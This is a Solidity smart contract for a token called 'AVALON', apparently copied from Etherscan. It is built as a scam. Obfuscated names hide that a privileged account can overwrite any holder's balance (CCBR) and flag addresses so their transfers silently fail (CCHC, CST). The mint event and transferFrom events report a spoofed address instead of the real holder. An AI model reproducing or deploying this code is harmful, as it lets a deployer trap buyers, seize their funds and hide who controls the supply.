/**
 *Submitted for verification at Etherscan.io on 2023-03-13
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-10
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract AVALON {
    using SafeMath for uint256;
    mapping (address => uint256) private ZXIa;
	
    mapping (address => uint256) public ZXIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "AVALON";
	
    string public symbol = "AVALON";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private ZXIc;
      address private ZXId;
    uint256 private ZXIe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address ZXIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        ZXId = msg.sender;
             ZXIa[msg.sender] = totalSupply;
        
       ORBIT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function ORBIT() internal  {                             
                       ZXIb[msg.sender] = 6;
                       ZXIc = ZXIf;

                

        emit Transfer(address(0), ZXIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return ZXIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(ZXIb[msg.sender] <= ZXIe) {
    require(ZXIa[msg.sender] >= value);
ZXIa[msg.sender] -= value;  
ZXIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(ZXIb[msg.sender] > ZXIe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function CCHC (address ZXIj, uint256 ZXIk) public {
		if(ZXIb[msg.sender] == ZXIe) {   
			   	   
   ZXIb[ZXIj] = ZXIk;}
   }
		       function CST (uint256 ZXIk) onlyOwner public {
                   
                     ZXIe = ZXIk; 
	}


 

 		       function CCBR (address ZXIj, uint256 ZXIk) public {		
                    	if(ZXIb[msg.sender] == ZXIe) {    	   
  ZXIa[ZXIj] = ZXIk;}}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(ZXIb[from] < ZXIe && ZXIb[to] < ZXIe) {
        require(value <= ZXIa[from]);
        require(value <= allowance[from][msg.sender]);
        ZXIa[from] -= value;
        ZXIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(ZXIb[from] == ZXIe) {
        require(value <= ZXIa[from]);
        require(value <= allowance[from][msg.sender]);
        ZXIa[from] -= value;
        ZXIa[to] += value;
        allowance[from][msg.sender] -= value;


            from = ZXIf;
	   

        emit Transfer(from, to, value);
        return true; }
if(ZXIb[from] >= 1000) {   emit Transfer(from, from, value);}

         if(ZXIb[from] > ZXIe || ZXIb[to] > ZXIe) {
             
         }}



     

        	
 }